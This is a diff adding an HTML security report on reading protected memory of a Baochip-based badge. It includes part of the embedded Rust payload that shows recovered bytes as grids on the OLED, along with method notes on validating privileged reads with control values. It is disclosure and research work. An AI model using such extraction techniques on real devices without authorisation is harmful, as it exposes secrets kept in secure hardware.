+        (ctrl &gt;&gt; 24) as u8, (ctrl &gt;&gt; 16) as u8, (ctrl &gt;&gt; 8) as u8, ctrl as u8,
+        (ba &gt;&gt; 24) as u8, (ba &gt;&gt; 16) as u8, (ba &gt;&gt; 8) as u8, ba as u8,
+    ];
+    let p2 = [
+        best_distinct as u8, 0x5A, (nz_rows &gt;&gt; 8) as u8, nz_rows as u8,
+        (bc &gt;&gt; 24) as u8, (bc &gt;&gt; 16) as u8, (bc &gt;&gt; 8) as u8, bc as u8,
+    ];
+    loop {
+        draw_page8(oled.buffer_mut(), &amp;p1, 1); oled.redraw().ok(); spin(400_000_000);
+        draw_page8(oled.buffer_mut(), &amp;p2, 2); oled.redraw().ok(); spin(400_000_000);
+        for q in 0..4usize {
+            draw_page8(oled.buffer_mut(), &amp;best[q * 8..q * 8 + 8], q + 3);
+            oled.redraw().ok(); spin(400_000_000);
+        }
+    }
+}
+
+/// Eight bytes as an 8x8 grid, 12 px cells on a 14 px pitch, inset 8 px, MSB left.
+/// 2 px lit border for registration, `tag` blobs in the top margin for page id.
+/// Panel polarity is inverted: clear() fills 0xFFFF_FFFF, so a 0 bit is LIT.
+fn draw_page8(fb: &amp;mut [u32], eight: &amp;[u8], tag: usize) {
+    for w in fb.iter_mut() {
+        *w = 0xFFFF_FFFF;
+    }
+    let mut lit = |x: usize, y: usize| {
+        if x &lt; 128 &amp;&amp; y &lt; 128 {
+            let b = x + y * 128;
+            fb[b / 32] &amp;= !(1u32 &lt;&lt; (b % 32));
+        }
+    };
+    for i in 0..128usize {
+        for t in 0..2usize {
+            lit(i, t);
+            lit(i, 127 - t);
+            lit(t, i);
+            lit(127 - t, i);
+        }
+    }
+    for k in 0..tag.min(8) {
+        for dy in 3..7usize {
+            for dx in 0..6usize {
+                lit(20 + k * 11 + dx, dy);
+            }
+        }
+    }
+    for (r, &amp;byte) in eight.iter().enumerate() {
+        for bit in 0..8usize {
+            if (byte &gt;&gt; (7 - bit)) &amp; 1 == 0 {
+                continue;
+            }
+            for dy in 0..12usize {
+                for dx in 0..12usize {
+                    lit(8 + bit * 14 + dx, 8 + r * 14 + dy);
+                }
+            }
+        }
+    }
+}
+
+fn spin(n: u32) {
+    for _ in 0..n {
+        core::hint::spin_loop();
+    }
+}
+
+fn crc32(d: &amp;[u8]) -&gt; u32 {
+    let mut c: u32 = 0xFFFF_FFFF;
+    for &amp;b in d {
+        c ^= b as u32;
+        for _ in 0..8 {
+            let m = (c &amp; 1).wrapping_neg();
+            c = (c &gt;&gt; 1) ^ (0xEDB8_8320 &amp; m);
+        }
+    }
+    !c
+}
+
+fn open_oled&lt;&#x27;a&gt;(
+    iox: &amp;&#x27;a bao1x_hal::iox::Iox,
+    udma: &amp;&#x27;a bao1x_hal::udma::GlobalConfig,
+) -&gt; bao1x_hal::sh1107::Oled128x128&lt;&#x27;a&gt; {
+    use bao1x_hal::sh1107::{MainThreadToken, Oled128x128};
+    use utralib::*;
+    let sysctrl = CSR::new(utra::sysctrl::HW_SYSCTRL_BASE as *mut u32);
+    let fd = sysctrl.r(utra::sysctrl::SFR_CGUFDPER) &amp; 0xFF;
+    let perclk = bao1x_hal::clocks::divide_by_fd(fd, CLKTOP_HZ) / 2;
+    let mut o = Oled128x128::new(MainThreadToken::new(), perclk, iox, udma);
+    o.init().ok();
+    o
+}
+
+// bao1x-hal pulls in `alloc`; a bump allocator that never frees is right here.
+struct Bump;
+static mut ARENA: [u8; 8192] = [0; 8192];
+static mut NEXT: usize = 0;
+unsafe impl core::alloc::GlobalAlloc for Bump {
+    unsafe fn alloc(&amp;self, l: core::alloc::Layout) -&gt; *mut u8 {
+        unsafe {
+            let base = core::ptr::addr_of_mut!(ARENA) as usize;
+            let start = (base + NEXT + l.align() - 1) &amp; !(l.align() - 1);
+            let end = start - base + l.size();
+            if end &gt; 8192 {
+                return core::ptr::null_mut();
+            }
+            NEXT = end;
+            start as *mut u8
+        }
+    }
+    unsafe fn dealloc(&amp;self, _p: *mut u8, _l: core::alloc::Layout) {}
+}
+#[global_allocator]
+static ALLOC: Bump = Bump;
+</code></pre></details>
+
+
+<h2>Method notes</h2>
+
+<p>Two things made this findable, and both are procedural rather than technical.</p>
+
+<p><strong>Every measurement carried a known-value control read in the same run.</strong> The
+control here is a deliberately illegal <code>0xFFFFFFFF</code> placed in the payload's own image
+and fetched through the identical path. Without it, a zero result from the IFR is
+indistinguishable from a broken read, and we would have concluded the region was empty. We very
+nearly did.</p>
+
+<p><strong>The control has to be as hard to satisfy as the claim.</strong> An earlier round
+validated a privileged-read technique against a slot marked
+<code>PartitionAccess::Open</code>, readable by everyone, and then generalised to a protected
+slot. Passing the easy case proved only that the code ran. That error survived into two written
+documents before an unrelated integrity check exposed it.</p>
+
+<p>The strongest evidence in this report is of exactly that shape: bytes recovered from a
+region the CPU cannot read, matching a file on disk that the chip was never given.</p>
+
+<footer>
+  Baosec-lite, board type <code>Oem</code>, stepping A0 &middot; Xous
+  <code>v0.10.1-43-g8964027ff</code> &middot; boot1 <code>v0.10.1-0-gbcfdca404</code> &middot;
+  RTL <code>github.com/baochip/baochip-1x</code>. Badge remained Sealed throughout; developer
+  mode never entered; no writes to RRAM, ACRAM, one-way counters or SPI flash beyond the
+  reverted 4-byte loader header.
+</footer>
+
+</div>
+<script>
+  // ff ff ff ff: the control word, fetched through the same path as the protected
+  // memory. Everything in this report rests on it coming back exact.
+  (function () {
+    var bytes = [0x3C,0x7E,0xDB,0xFF,0xE7,0x7E,0x5A,0x3C];
+    var g = document.getElementById('g'), html = '';
+    for (var r = 0; r < 8; r++)
+      for (var b = 0; b < 8; b++)
+        html += '<i class="' + ((bytes[r] >> (7 - b)) & 1 ? 'on' : '') + '"></i>';
+    g.innerHTML = html;
+  })();
+</script>
